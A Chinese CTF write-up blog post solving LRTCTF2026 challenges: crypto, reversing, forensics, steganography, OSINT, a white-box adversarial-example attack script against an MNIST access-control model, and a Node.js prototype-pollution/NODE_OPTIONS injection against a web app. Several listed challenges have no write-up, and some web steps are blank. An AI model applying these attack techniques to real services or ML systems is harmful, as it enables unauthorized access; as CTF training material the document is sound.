---
title: LRTCTF2026 WP
date: 2026-11-08 18:00:00
categories: [CTF]
tags: [CTF, WP, LRTCTF, 逆向, Pwn, Web]
cover: /img/lrtctf-cover.jpg
---

打了一整场 LRTCTF2026，21 题基本都做穿了，题目分布挺杂——Crypto、Reverse、Misc、Web、Pwn、AI 对抗、OSINT 都有。这篇把每题的过程摊开写，代码和命令都是当时用的原样。

## 目录

| #  | 题目              | 类别      | Flag                                             |
| -- | ----------------- | --------- | ------------------------------------------------ |
| 1  | 口算              | Crypto    | `lrtctf{65}`                                     |
| 2  | Silent Broadcast  | Crypto    | `lrtctf{h4st4d_br0adc4st_1s_n0t_s4fe}`           |
| 3  | GoBack            | Reverse   | `lrtctf{XiaoSiGame}`                             |
| 4  | HRDrev            | Reverse   | `lrtctf{Th1s_ReV3r53_t4sk_1s_4_b1t_ch4ll3ng1ng}` |
| 5  | 数学高手          | Reverse   | `lrtctf{welcome_lrtctf}`                         |
| 6  | 签到题            | Misc      | `lrtctf{w3lc0m_T0_1@pr15kt3am}`                  |
| 7  | In Girl           | Misc      | `lrtctf{139e1603741c4ffb4a88a7776d79ab6f}`       |
| 8  | Lap酱的门禁       | AI 对抗   | `lrtctf{6f60191d-7a27-4f5b-bf5b-aaca9a30c612}`   |
| 9  | LAP酱的旅行日记Ⅱ | OSINT     | `lrtctf{辽宁葫芦岛_天津_2026/8/23_0911}`         |
| 10 | 取证·内存转储    | Misc      | `flag{m3m0ry_1s_4lw4ys_th3r3}`                   |
| 11 | CronHub           | Web       | `lrtctf{NoD3_jS_?_02d2495388ac}`                 |
| 12 | Lrtmall           | Web       | `lrtctf{PatH_TrAVle_a2319008d8ad}`               |
| 13 | Overstack         | Pwn       | `lrtctf{7328047a-d241-442e-95d5-e8f3d6414f93}`   |
| 14 | ez_23             | Crypto    | `lrtctf{common_modulus_attack}`                  |
| 15 | 听音              | Misc      | `lrtctf{04420FEED1585E1A5688C4867CE103C3}`       |
| 16 | Mazerev           | Reverse   | `lrtctf{d75871d810d84814126b8427d579c25a}`       |
| 17 | USB               | Misc      | `lrtctf{f08540829e577d6517b4ecf60de8e79a}`       |
| 18 | 阿巴巴巴巴⑧      | Web       | `lrtctf{96cc3418-f1cd-4bd1-98ca-bb8b1f855ba3}`   |
| 19 | 问卷              | Misc      | `lrtctf{lrtctf_1s_s0_3asy!}`                     |
| 20 | Tilde             | Pwn       | `lrtctf{2da5d7c5-d4e0-4b5c-af02-9a3003a4cf2c}`   |
| 21 | 工厂零信任数仓    | Reverse   | `lrtctf{49c1448ab776e6fb992d1722}`               |

---

# Crypto

## 1. 口算

这题没什么好想的。rsa.py 把 p=61、q=53、e=17 全给了，第 8 行明写着 `m = 65`，连求 `m` 的步骤都省了，拿私钥直接解一遍验证一下就行。

exp：

```python
p, q, e, m = 61, 53, 17, 65
n, phi = p * q, (p - 1) * (q - 1)
d = pow(e, -1, phi)                        # 2753
print(f"lrtctf{{{pow(pow(m, e, n), d, n)}}}")
```

```
flag：lrtctf{65}
```

## 2. Silent Broadcast

该场景中，系统将同一条消息分别发送至 alpha、beta、gamma 三个终端，且三个终端各自使用独立的 RSA 密钥，公钥指数均为 e=3e=3。源码中还包含一个 backup 通道，其 nn 为 `1234567890...`、`data` 为 `987654321...`，明显为伪造数据，属于干扰项。

考虑 Håstad 广播攻击。进一步查看源码可知，出题人已提供 `merge_packets()`（即 CRT 合并）、`integer_cube_root()` 与 `number_to_bytes()` 等关键函数，利用路径较为明确。

检查数据时发现，三份密文完全一致。通常情况下，不同模数加密同一消息所得密文不应相同；除非 m3m3 未超过模数，即加密过程中未发生回绕。核对位数可知，密文为 861 bit，而最小的 nn 为 963 bit，足以容纳 m3m3。因此可判定 c=m3c=m3 本身，无需进行 CRT 合并，直接对密文开立方即可恢复明文。

```python
# exp
from math import prod
packets = [
    (132111391938796015570812962000815176036068052550015619469461774748462641838517346829223389138817488892265747381516037804124109000900237907388616246780184457359908360923361016722766184086860223326016142662595794479062149535813606266669148880814255794078179508459984840573970218059426339580293854062693677541203,
     9350827553280369628999104613936543175021426316980818077380453958584157521232324535369375619309650706161140582027515355043918852859658183851700228786032381689299259492007433363885744515854352473790843021724546169393057929638034654349796709198318275394342253669),
    (99981430014524046636458912593227067654071380584027407749230698392622548159114098740020292250656174033121841918075717550559388531417551115958117102938443226694309913420308986699489845421223823843442434637485400768691583103965617893711206472036380199907754818296853069508694621802558441969912703165753873657507,
     9350827553280369628999104613936543175021426316980818077380453958584157521232324535369375619309650706161140582027515355043918852859658183851700228786032381689299259492007433363885744515854352473790843021724546169393057929638034654349796709198318275394342253669),
    (65676148224971333317940406479999775136823720751238528193171917319820871314029931127290759271332364035453092816866372419738783881427463873769001681385845246277425700357010136135008260642115890295129406100577658144547663473549157670608828009492597162317303883570429703622020369442252472679797,
     9350827553280369628999104613936543175021426316980818077380453958584157521232324535369375619309650706161140582027515355043918852859658183851700228786032381689299259492007433363885744515854352473790843021724546169393057929638034654349796709198318275394342253669),
]
c0 = packets[0][1]
assert all(p[1] == c0 for p in packets) and c0 < min(p[0] for p in packets)

def icbrt(x):
    low, high = 0, 1
    while high ** 3 <= x:
        high *= 2
    while low + 1 < high:
        mid = (low + high) // 2
        low, high = (mid, high) if mid ** 3 <= x else (low, mid)
    return low

m = icbrt(c0)                       
assert m ** 3 == c0
print(m.to_bytes((m.bit_length() + 7) // 8, "big"))

N = prod(p[0] for p in packets)
x = sum(c * (N // n) * pow(N // n, -1, n) for n, c in packets) % N
assert x == c0 and icbrt(x) ** 3 == x
```

输出 `b'lrtctf{h4st4d_br0adc4st_1s_n0t_s4fe}'`。

```
flag:lrtctf{h4st4d_br0adc4st_1s_n0t_s4fe}
```

## 14. ez_23

共模攻击（Common Modulus Attack）。同一 `n` 下用两个互素的指数加密同一条消息：`e1=65537`、`e2=17`，`gcd(e1,e2)=1`，题目只给了 n、e1/e2、c1/c2，连源码都省了。

由扩展欧几里得求出 `a·e1 + b·e2 = 1`（此处 `a=-8, b=30841`），于是：

```
c1^a · c2^b ≡ m^(a·e1) · m^(b·e2) ≡ m (mod n)
```

负指数用 `pow(x, -1, n)` 求逆元补上即可，全程不需要分解 n。

```python
# solve.py
def egcd(a, b):
    if b == 0:
        return (a, 1, 0)
    g, x, y = egcd(b, a % b)
    return (g, y, x - (a // b) * y)

gg, a, b = egcd(e1, e2)          # a=-8, b=30841
assert gg == 1 and a * e1 + b * e2 == 1

m = (pow(pow(c1, -a, n), -1, n) * pow(c2, b, n)) % n
print(m.to_bytes((m.bit_length() + 7) // 8, "big"))
assert pow(m, e1, n) == c1 and pow(m, e2, n) == c2   # 双密文回验通过
```

输出 `b'lrtctf{common_modulus_attack}'`。

```
flag:lrtctf{common_modulus_attack}
```

---

# Reverse

## 3. GoBack

附件 `go_back.py`，核心函数：

```python
def up(x):
    x = [f"{ord(x[i]) << 1:08b}" for i in range(len(x))]
    return ''.join(x)

def down(x):
    x = ''.join(['1' if x[i] == '0' else '0' for i in range(len(x))])
    return x

def right(x, d):
    x = x[d:] + x[0:d]
    return x

def left(x, d):
    x = right(x, len(x) - d)
    return x[::-1]

def encode(plain):
    d = 24
    x = up(plain)
    x = right(x, d)
    x = down(x)
    x = left(x, d)
    return x

encoded_flag = "1010000010101100101001001011110..."
```

加密顺序 `up → right → down → left`，提示可逆，从最后一步倒推。

### 解题

- `up`：每个字符转 `ord << 1` 的 8 位二进制。最后密文 144 bit，即明文 18 字符。`ord` 最大 127，左移后 ≤254，不会溢出 8 bit，无信息损失。
- `right`：位串**循环右移 24 位**，注意对象是位串不是字符。
- `down`：逐位取反。
- `left`：这步最坑。先 `right(x, len-24)`，等价于**循环左移 24 位**，然后整体 `[::-1]` **反转**。第一遍倒推时把它当普通 left rotate 处理，解出来全是乱码，回头才发现末尾还挂着个 reverse。

倒推：从后往前，每个操作取逆——

1. `left` 的逆：先反转回来，再循环**右**移 24 位（正着是左移 24）
2. `down` 的逆：再取反一次
3. `right` 的逆：循环**左**移 24 位
4. `up` 的逆：每 8 位一组，`int(bits, 2) >> 1` 得回字符

### exp.py

```python
enc = "1010000010101100101001001011110010001110101101001001101010000100" \
      "101111001011010011110010100100001100110011101000100111001110100" \
      "01101100011100100"                      
d = 24

x = enc[::-1]                                  
x = x[-d:] + x[:-d]                             
x = ''.join('1' if c == '0' else '0' for c in x)  # undo down: 取反
x = x[d:] + x[:d]                               
flag = ''.join(chr(int(x[i:i+8], 2) >> 1)       
               for i in range(0, len(x), 8))
print(flag)
```

`lrtctf{XiaoSiGame}`。

```
flag:lrtctf{XiaoSiGame}
```

## 4. HRDrev

### 分析

解压附件：

```
challenge2.exe   
bytecode.bin
```

exe + 一份叫 bytecode 的文件，exe 里面全是高熵乱码，PE 能看到 `libgcc_s_seh-1.dll`、`libstdc++-6.dll`（MinGW 编的）和 `ExitProcess / GetProcAddress / LoadLibraryA / VirtualProtect`，节名是 UPX0/UPX1，upx：

```
upx -d challenge2.exe -o challenge2_unpacked.exe
```

脱完 25 KB，strings ：

```
Bytecode read violation.
Invalid register.
Memory access violation.
Unknown opcode: 0x
Cannot open bytecode:
=====================================
        LRTCTF Reverse Challenge
=====================================
Input flag:
Wrong!
Correct!
VM Error!
```

电脑上没 IDA，python + capstone 反汇编 `.text`，用 `.pdata` 的 RUNTIME_FUNCTION 表切出 62 个函数边界。

### main

main 在 `0x140003F00`：

1. 打 banner，`getline` 读 flag；
2. `cmp qword ptr [rsp+0x88], 0x2e` —— **长度必须正好 46**，不等直接退出；
3. 读 `bytecode.bin` 进缓冲区；
4. `malloc(46)`，flag 拷进去，这段内存就是 VM 的"内存"，`[base, end)`；
5. VM 状态体清零初始化，调 `0x140003900` 执行 VM；
6. 返回值：`eax==0` → `Correct!`，`eax==1` → `Wrong!`，其他 → `VM Error!`。

### VM 指令集

VM 状态（rcx 传入）：

```
+0x00  regs[8]     8 个 u32 寄存器
+0x20  pc          u32
+0x24  zero_flag   u8（CMP 里 sete 写入）
+0x28  code_ptr / +0x30 code_size
+0x40  mem_ptr  / +0x48 mem_size        <- flag
```

分发是查表跳转：`lea rbx, [0x1400060AC]`、`jmp rbx + dword[r9*4]`。把 `.rdata` 里 14 个表项拉出来对 handler：

| op          | 指令                                               | 长度 |
| ----------- | -------------------------------------------------- | ---- |
| 01/08       | `MOV / XOR r, imm32`（imm 小端）                   | 6    |
| 02/03/04/05 | `MOV / XOR / ADD / SUB ra, rb`                     | 3    |
| 06/0A       | `ROL r, imm8`（32 位循环左移）                     | 3    |
| 07          | `LOADW r, [addr16]`（内存小端读 2 字节，补零扩展） | 4    |
| 09          | `ADD r, imm32`                                     | 6    |
| 0B          | `CMP r, imm32`，`sete` 写 zero_flag                | 6    |
| 0C          | "JE"                                               | 3    |
| 0D          | `JMP addr16`                                       | 3    |
| FF          | HALT                                               | 1    |

op 0x00 报 Unknown opcode；>0x0D 里只有 0xFF 认。HALT 出口：

```
r0 == 0x600df00d  -> return 0   Correct!
r0 == 0xbad0bad0  -> return 1   Wrong!
else              -> return -1  VM Error!
```

### 解 bytecode

写个解码器按这套 ISA 跑 865 字节，结尾两段：

```
0353: MOV r0, 0x600df00d
0359: HALT
035a: MOV r0, 0xbad0bad0
0360: HALT
```

0x035A 是 Wrong 路径，所有失败分支全汇到这。前面 23 个块全是同一模板，第一块：

```
0000: LOADW r0, mem[0x0]
0004: XOR   r0, 0x13572468
000a: ADD   r0, 0x24681357
0010: ROL   r0, 5
0013: MOV   r1, 0xf7ed2b66
0019: XOR   r0, r1
001c: CMP   r0, 0
0022: JNE   0x035a
```

23 块的区别只有三处：`LOADW` 的偏移 0~44 步进 2（23 对 × 2 字节 = 46，正好把 flag 每两字节切一段）、K1/K2/旋转量、期望值。每块约束：

```
LE16(flag[a:a+2])  →  v
ROL32(((v ^ K1) + K2) & 0xffffffff, rot) == expected
```

### exp.py

```python
# exp
data = open("bytecode.bin", "rb").read()

u32 = lambda o: int.from_bytes(data[o:o+4], "little")
u16 = lambda o: int.from_bytes(data[o:o+2], "little")

blocks, cur, o = [], None, 0
while o < len(data):
    op = data[o]
    if op == 0x07:                            
        cur = {"addr": u16(o + 2), "k1": None, "k2": None, "rot": None, "exp": None}
        o += 4
    elif op == 0x08:                            
        cur and cur.update(k1=u32(o + 2)); o += 6
    elif op == 0x09:                            
        cur and cur.update(k2=u32(o + 2)); o += 6
    elif op in (0x06, 0x0A):                   
        cur and cur.update(rot=data[o + 2]); o += 3
    elif op == 0x01:                           
        if cur and cur["exp"] is None:
            cur["exp"] = u32(o + 2)
        o += 6
    elif op == 0x0B:                          
        blocks.append(cur); cur = None; o += 6
    elif op in (0x02, 0x03, 0x04, 0x05, 0x0C, 0x0D):
        o += 3                             
    elif op == 0xFF:
        break                                  
    else:
        raise SystemExit(f"unknown op {op:#x} at {o:#x}")

def rol32(x, n):
    n &= 31
    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF if n else x & 0xFFFFFFFF

flag = [None] * 46
for b in blocks:                                
    for v in range(1 << 16):
        if rol32(((v ^ b["k1"]) + b["k2"]) & 0xFFFFFFFF, b["rot"]) == b["exp"]:
            lo, hi = v & 0xFF, v >> 8
            if 0x20 <= lo < 0x7F and 0x20 <= hi < 0x7F:
                flag[b["addr"]], flag[b["addr"] + 1] = chr(lo), chr(hi)
            break
print("".join(c or "?" for c in flag))
```

23 块每块恰好 1 个可打印解。逐段拼出来：

```
lr tc tf {T h1 s_ Re V3 r5 3_ t4 sk _1 s_ 4_ b1 t_ ch 4l l3 ng 1n g}
```

```
flag:lrtctf{Th1s_ReV3r53_t4sk_1s_4_b1t_ch4ll3ng1ng}
```

## 5. 数学高手

附件 `ez2`（ELF 64-bit，stripped，PIE）。

main 里先往栈上写了两组 dword，然后 `scanf("%255s")`，`strlen` 必须等于 `0x16`（22 字节）。之后 `rdx` 从 0 到 `0xA`，每次取输入里相邻两个字符：

```
a = flag[2*i]          // movsx
b = flag[2*i+1]
a + b  ==  sum[i]       // [rsp+rdx*4]
a - b  ==  diff[i]      // [rsp+0x30+rdx*4]
```

栈上的常数：

```
sum  = [0xDE, 0xD7, 0xDA, 0xF2, 0xD1, 0xD2, 0xD2, 0xCB, 0xE6, 0xD7, 0xE3]
diff = [  -6,   17,   14,    4,   -7,  -12,    8,  -13,   -2,  -17,  -23]
```

二元一次方程，`a = (s+d)/2`，`b = (s-d)/2`，exp ：

```python
# exp
sums  = [0xde,0xd7,0xda,0xf2,0xd1,0xd2,0xd2,0xcb,0xe6,0xd7,0xe3]
diffs = [-6,17,14,4,-7,-12,8,-13,-2,-17,-23]
print("".join(chr((s+d)//2) + chr((s-d)//2) for s, d in zip(sums, diffs)))
```

```
lrtctf{welcome_lrtctf}
```

## 16. Mazerev（Reverse · ⭐⭐⭐☆☆）

**Flag：`lrtctf{d75871d810d84814126b8427d579c25a}`**

### 识别与脱壳

附件 `challenge1.exe` 为 PE32+ 控制台程序，节表为 `UPX0/UPX1/UPX2`，UPX 壳。但文件尾部（`0x9000` 之后）保留了一段约 46KB 的 **COFF 符号表 + 字符串表**（UPX 头里的 `PointerToSymbolTable` 已失效，直接按 overlay 解析即可，2076 个符号 ×18 字节 + 字符串表），直接拿到了 `challenge.cpp` 的全部函数符号：

```
Encode, MD5Transform, init_stage, move_player,
MD5Init/Update/Final, recover_route(int, char*), check_flag, solve_stage
```

环境里没有 `upx -d`，于是采用**运行时脱壳**：启动程序（它在 `scanf` 处等待输入），用 `OpenProcess + ReadProcessMemory` 把 `PEB->ImageBaseAddress` 起的整个映像（0x28000 字节）dump 下来，得到解压后的内存映像，配合 capstone 反汇编。`.text` 基址 `0x140001000`，符号值直接加上去就是函数地址。

### 逆向分析

`main`：打印 banner → `scanf("%127s", buf)` → `check_flag(buf)`，正确才打印 `right`。

`check_flag(s)`：

- `strncmp(s, "lrtctf{", 7) == 0`
- `strlen(s) == 40` 且 `s[39] == '}'`
- 进入核心逻辑（`check_flag.part.0`）：

```
recover_route(0, buf0) && recover_route(1, buf1) && recover_route(2, buf2)
strcpy(combined, buf0); strcat(combined, buf1); strcat(combined, buf2);
MD5(combined) → 16 字节 → sprintf("%02x") → 32 位小写 hex
strncmp(s + 7, md5hex, 32) == 0   // 即 flag = lrtctf{md5hex}
```

三个全局 15×15 `int` 网格位于 `0x140014020`，每关 225 个 int（`stage*225` 偏移）；`1=通路, 0=墙, 3=起点S, 4=终点E`（`init_stage`/`solve_stage`/`move_player` 是一套没被 main 调用的"玩游戏"交互代码，纯摆设）。

`recover_route(stage, out)`：标准的 **FIFO BFS** 找 S→E 最短路，方向枚举顺序来自常量 `0x77617364`（内存中即字符串 `"dsaw"`，先 `d` 后 `s` 后 `a` 最后 `w`），可走格子判定 `grid[n] ∈ {1,3,4}`（汇编为 `(unsigned)(g-3) <= 1 || g == 1`，注意是无符号比较），parent 数组回溯得到 WASD 路径串。

### 求解

用 Python 按同样的方向优先级复刻 BFS（第一版把 `g-3<=1` 当有符号比较吃了大亏，复刻出的"最短路"直接穿墙，被真机打脸后用 Unicorn 模拟 `recover_route` 抓取二进制真实输出逐关对拍修正）。三关的最短路：

| 关卡 | 路径（长 25/27/15） |
|---|---|
| stage 0 | `dddsssddssaaawaasssddddds` |
| stage 1 | `dddddssaassaawwaassssddddds` |
| stage 2 | `ddssddwwddssssa` |

拼接后 `md5("dddsssddssaaawaasssddddds" + "dddddssaassaawwaassssddddds" + "ddssddwwddssssa")` = `d75871d810d84814126b8427d579c25a`。

验证：`echo "lrtctf{d75871d810d84814126b8427d579c25a}" | ./challenge1.exe` → 输出 `right` ✓

### 收获

- UPX 壳 + 符号表没删干净：overlay 里的 COFF 符号表白送函数边界。
- 没有 upx 工具时，"跑起来 + ReadProcessMemory dump 自身映像" 是最快的脱壳方式。
- 复刻算法时 C 的 `(unsigned)(x-3) <= 1` 惯用法对应 `x in {3,4}`（含下溢回绕），Python 里写成有符号 `<=` 会把墙也放进来；拿模拟器/真机输出做对拍能立刻暴露这类偏差。

---

# Misc

## 6. 签到题

签到处的二维码扫出来就是这串，直接交。

```
lrtctf{w3lc0m_T0_1@pr15kt3am}
```

## 7. In Girl

Misc（隐写 / 文件拼接），附件 `girl.zip`。

解压只有一张 `girl.png`。文件名是 png，文件头是 JPEG 的 `FF D8 FF E0`（JFIF），末尾又是 PNG 的 `IEND`。前面一张 jpg，`FF D9` 后面再拼一张 png。

在 `0xFFD9` 前面能扫到 `lrtctf{hint!flag}`，一眼假，flag 不在这层图上。

exp 按文件头自动切开再解二维码：

```python
# exp_ingirl.py
import io
import numpy as np
import cv2
from PIL import Image

raw = open("girl.png", "rb").read()
assert raw[:3] == b"\xff\xd8\xff"               
png_off = raw.find(b"\x89PNG")
jpg_end = raw.rfind(b"\xff\xd9", 0, png_off) + 2
print(f"jpeg 0~{jpg_end}  png {png_off}~{len(raw)}")   

img = Image.open(io.BytesIO(raw[png_off:])).convert("L")
bw = np.where(np.array(img) < 128, 0, 255).astype("uint8")
padded = np.pad(bw, 40, constant_values=255)    
val, _, _ = cv2.QRCodeDetector().detectAndDecode(
    cv2.cvtColor(padded, cv2.COLOR_GRAY2BGR))
print(val)
```

抠出来的 png 是 250×250 的二维码，解码内容：

```
你好！lrtctf{139e1603741c4ffb4a88a7776d79ab6f}
```

```
lrtctf{139e1603741c4ffb4a88a7776d79ab6f}
```

## 15. 听音

Misc（音频 Morse），附件 `morse_noisy.wav`（44100 Hz / 16bit / 单声道 / 36.6s），带噪的 800 Hz 音频摩尔斯。

### 打法

先 FFT 找载波：峰值恰好在 800 Hz，高频段全是白噪声。做相干解调（乘 `e^{-j2π·800t}`）取模得到包络，5ms 滑动平均低通，Otsu 自适应门限切出开关序列；再对游程做聚类去毛刺（丢弃 <11ms 的噪声毛刺）：

| 类型 | 长度（样本）   | 含义             |
| ---- | -------------- | ---------------- |
| ON   | ~3300          | 点               |
| ON   | ~10362 ≈ 3×3300 | 划              |
| OFF  | ~3751          | 字内间隔         |
| OFF  | ~10805 ≈ 3×3300 | 字母间隔        |

无词间隔，共 135 个符号 = 32 个字符，全部落在 `[0-9A-F]`，是一段 MD5 样式的十六进制串：

```python
# decode.py（关键部分）
msg, cur = [], ""
for i, r in enumerate(on_f):
    cur += "." if r < 6000 else "-"
    if i < len(off_f) and off_f[i] > 7000:
        msg.append(MORSE[cur]); cur = ""
```

解出 `04420FEED1585E1A5688C4867CE103C3`。对照本赛其它题（第 7 题 In Girl 的 flag 也是 32 位 hex 直接作内容），hex 即 flag 本体，无需再反查 MD5。

```
flag:lrtctf{04420FEED1585E1A5688C4867CE103C3}
```

---

# AI

## 8. Lap酱的门禁（AI 对抗）

附件 model.py / model.pt / sample.png。页面规则：往 /api/submit 提交一张图，要求 ① 模型预测为"根号49"；② 和基准图 sample.png的 L∞ 扰动 ≤ 0.35。另有 /api/predict 可以随便调试。模型是 MNIST 分类 CNN，权重直接给——白盒定向对抗样本。

完整 exp：

```python
# exp
import sys
import numpy as np
import torch
import torch.nn.functional as F
from PIL import Image

sys.path.insert(0, "附件")                    
from model import load_model

model = load_model("附件/model.pt")
for p in model.parameters():
    p.requires_grad_(False)

x0 = np.array(Image.open("附件/sample.png").convert("L"), dtype=np.float32) / 255.0
x0t = torch.tensor(x0)[None, None]
EPS, TARGET = 0.34, 7

def cw_margin(logits):
    others = logits[0].clone()
    others[TARGET] = -1e9
    return others.max() - logits[0, TARGET]

best = None
for seed in range(8):
    torch.manual_seed(seed * 1234)
    x = (x0t + torch.empty_like(x0t).uniform_(-EPS, EPS)).clamp(0, 1)
    x = x.detach().requires_grad_(True)
    opt = torch.optim.Adam([x], lr=0.02)
    for i in range(2500):
        opt.zero_grad()
        margin = cw_margin(model(x))
        if margin.item() < -10:
            break
        F.relu(margin + 10).backward()
        opt.step()
        with torch.no_grad():
            x.clamp_(x0t - EPS, x0t + EPS)
    m = cw_margin(model(x)).item()
    print(f"seed {seed}: margin {m:+.3f} pred {model(x).argmax(1).item()}")
    if best is None or m < best[0]:
        best = (m, x.detach().clone())
    if m < -10:
        break

m_best, x_best = best
arr = (x_best.numpy()[0, 0] * 255).round().clip(0, 255).astype(np.uint8)
Image.fromarray(arr, "L").save("adv2.png")

back = np.array(Image.open("adv2.png").convert("L"), dtype=np.float32) / 255.0
print("post-quant pred:", model(torch.tensor(back)[None, None]).argmax(1).item(),
      "L_inf =", round(np.abs(back - x0).max(), 4))
```

第一个就打穿了，margin 从 +21 推到 -10。量化成 uint8 PNG 后复核，预测还是 7，扰动 0.3412 ≤ 0.35。predict 确认服务器也认（置信度 0.9999），submit：

```json
{"flag":"lrtctf{6f60191d-7a27-4f5b-bf5b-aaca9a30c612}",
 "perturbation":0.3412, "prediction":7, "success":true}
```

# OSINT

## 9. LAP酱的旅行日记Ⅱ

图片 OSINT。啦啦啦.jpg，元数据。
file 一把梭，连工具都不用装，EXIF TIFF 头里的 base64 直接打了出来：

```
description=5ZWm5ZWm5ZWm
manufacturer=ZmFrZSBzaG9vdGluZyB0aW1l
model=Y29ycmVjdGRhdGU=
copyright=ZnJvbWxpYW9uaW5naHVsdWRhbw==
```

再用 PIL 全量转储，把 EXIF 基础字段、ExifIFD 镜头字段、XMP 的 MicrosoftPhoto 扩展字段全翻了一遍，每个字段一条提示：

- ImageDescription / XPComment / XPSubject / XPKeywords：`5ZWm5ZWm5ZWm` → 啦啦啦，对应文件名，干扰项
- Make：`ZmFrZSBzaG9vdGluZyB0aW1l` → fake shooting time，EXIF 里的拍摄时间是假的
- Model：`Y29ycmVjdGRhdGU=` → correctdate，日期是对的
- Copyright：`ZnJvbWxpYW9uaW5naHVsdWRhbw==` → fromliaoninghuludao，出发地辽宁葫芦岛
- LensMake：`TEVJQ0E=` → LEICA，伪装徕卡镜头，干扰
- LensModel：`dG90aWFuamluZw==` → totianjing，to tianjing，目的地天津
- XMP FlashManufacturer：`dGltZV8wOTEx` → time_0911，真实时间 09:11
- Photoshop IRB (0xEA1C)：空块，没藏东西

exp 就是这个全量转储流程，XMP 那部分 PIL 不吐，直接翻字节：

```python
# exp_osint.py
import base64, re
from PIL import Image
from PIL.ExifTags import TAGS

F = "啦啦啦.jpg"
im = Image.open(F)
for tid, val in im.getexif().items():
    name = TAGS.get(tid, hex(tid))
    s = val.decode(errors="replace") if isinstance(val, bytes) else str(val)
    if re.fullmatch(r"[A-Za-z0-9+/=]+", s) and len(s) >= 4:
        try:
            s += "  ->  " + base64.b64decode(s).decode()
        except Exception:
            pass
    print(f"{name:22s} {s}")

raw = open(F, "rb").read()          
for m in re.finditer(rb'([A-Za-z]+)="([A-Za-z0-9+/=]{8,})"', raw):
    try:
        print(m.group(1).decode(), "->", base64.b64decode(m.group(2)).decode())
    except Exception:
        pass
```

拼 flag 的格式按示例来：`重庆_四川成都` 这个例子说明直辖市不带省名、地级市带省名，所以葫芦岛写全"辽宁葫芦岛"。

```
lrtctf{辽宁葫芦岛_天津_2026/8/23_0911}
```

---

MISC（取证）
------------

## 10. 取证·内存转储

flag 是 `flag{...}` 不是 lrtctf 前缀

附件 memory.zip（961 MB）解压出 memory.dmp，4,294,367,360 字节 ≈ 4 GB，Linux LiME 内存镜像。
grep。这个量级的题目先全文搜关键字，4 GB 文件 `grep -aob "flag{"` 几十秒跑完，命中 7 处：

```
2838262152  2923166216  2923168950  2923170320  2923173054  2935882697  2935886409
```

带着上下文看，7 处去重后是两个 flag、三种来源：

1. **bash 堆里的变量值**（offset 2838262152）：标准的 bash 字符串堆布局——长度前缀 `1d 00 00 00`（29 = 28 字符 + NUL）+ `flag{m3m0ry_1s_4lw4ys_th3r3}` + 两侧 `cf` 填充。
2. **部署脚本残片**（2923166216 等）：出题环境的安装脚本被 bash 读进内存后驻留，整套考题设计都在里面：
   
   ```bash
   LIME_DIR="/root/LiME"                 # 用 LiME 抓的 Linux 内存镜像
   OUTPUT="/tmp/memory.dmp"
   FLAG="flag{m3m0ry_1s_4lw4ys_th3r3}"   # ← 主 flag
   AES_PASS="P@ssw0rd_linux_mem_2024"    # 加密备份变体的口令
   INCLUDE_ROOTKIT=false                 # 本捕获未启用 rootkit
   ```
3. **rootkit 变体的 flag**（offset 2935882697）：`flag{h1dd3n_pr0c3ss_r00tk1t}`——脚本 `echo "flag{...}" > /tmp/hidden_flag` 后 `insmod /root/hideproc.ko target=$PID` 隐藏进程。但本捕获 `INCLUDE_ROOTKIT=false`，这是另一个变体的答案。

```bash
grep -aob "flag{" memory.dmp
```

```python
# exp
HITS = [2838262152, 2923166216, 2923168950, 2923170320,
        2923173054, 2935882697, 2935886409]
with open("memory.dmp", "rb") as f:
    for off in HITS:
        f.seek(max(0, off - 128))
        print(f"\n=== {off} ===")
        print(f.read(320).decode("utf-8", "replace").replace("\x00", "·"))
```

```
flag{m3m0ry_1s_4lw4ys_th3r3}
```

## 17. USB

取证（USB 流量），附件 `mouse_trajectory.pcap`，⭐⭐☆☆☆，500 pts。

`file` 一把梭：Linux usbmon 抓包（链路类型 220，`LINKTYPE_USB_LINUX_MMAPPED`），1763 个包全是 `len_cap = 4` 的 HID 数据——4 字节 USB 鼠标报告 `[buttons, dx, dy, wheel]`。把每包的 `dx`、`dy`（有符号 8 位补码）累加即可还原轨迹。

```python
# 1) 解析 usbmon
from scapy.all import rdpcap

pkts = rdpcap('mouse_trajectory.pcap')

def s8(v):                      # 有符号 8 位
    return v - 256 if v > 127 else v

x = y = 0
pts = [(0, 0)]
for p in pkts:
    d = bytes(p)[64:68]         # 跳过 64 字节 usbmon 头
    x += s8(d[1]); y += s8(d[2])
    pts.append((x, y))
```

坐标范围 x: 0~2652、y: 0~72，位移几乎全是 12 的整数倍——"逻辑像素 = 12 计数"，真实画面约 221×6 像素，一行 7 像素高的点阵字。

```python
# 2) 画轨迹读 flag
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

xs = [p[0] for p in pts]; ys = [p[1] for p in pts]
plt.figure(figsize=(26, 6))
plt.plot(xs, ys, linewidth=0.6)
plt.gca().invert_yaxis()        # 屏幕坐标向下为正，Y 轴要反转
plt.axis('off')
plt.savefig('traj1.png', dpi=160, bbox_inches='tight')
```

两个坑：① Y 轴要反转；② 长宽比要按 1:1（或按 12 计数/逻辑像素）校正，直接铺满画布字形会被压扁，容易误读（`e/c`、`b/6`）。渲染出来是一串 32 位 hex：

```
f08540829e577d6517b4ecf60de8e79a
```

> 抓包里 `buttons` 字节呈 `011011` 周期性重复，是生成器噪声；`wheel` 恒为 0；少数异常值（如 -127）是抖动，只取 `dx`、`dy` 即可。

```
flag:lrtctf{f08540829e577d6517b4ecf60de8e79a}
```

---

# Web

## 11. CronHub

Web（Node.js 原型链污染 → NODE_OPTIONS 命令注入）。这题后半段全是浏览器手工点的，思路很直：先靠 `__proto__` 把 `isAdmin` 污染进去骗过后台鉴权，再往 `NODE_OPTIONS` 里塞 `--require` 挂自己的脚本，让下次任务执行时把 `/flag` 读回来。

1. 首页配置框填 `{"constructor":{"prototype":{"isAdmin":true}}}`，点「更新配置」——响应里 `config` 直接多出 `"isAdmin":true`：JSON 序列化把原型上的新属性带了出来，污染成功的活证据。

2. 点右上角「管理后台」——「✔ 管理员身份验证通过」，后台页面自己都把 `child_process.spawn` 提示出来了。

3. 回首页配置框填 NODE_OPTIONS 污染（浏览器里引号原样写，没有 shell 转义问题）：

4. 点「运行任务」，输出区直接回传 `/flag`：

flag：`lrtctf{NoD3_jS_?_02d2495388ac}`

## 12. Lrtmall

Web / ⭐☆☆☆☆，动态容器。LAP 酱开了个商城卖商品，说可以来挑心仪的 flag。

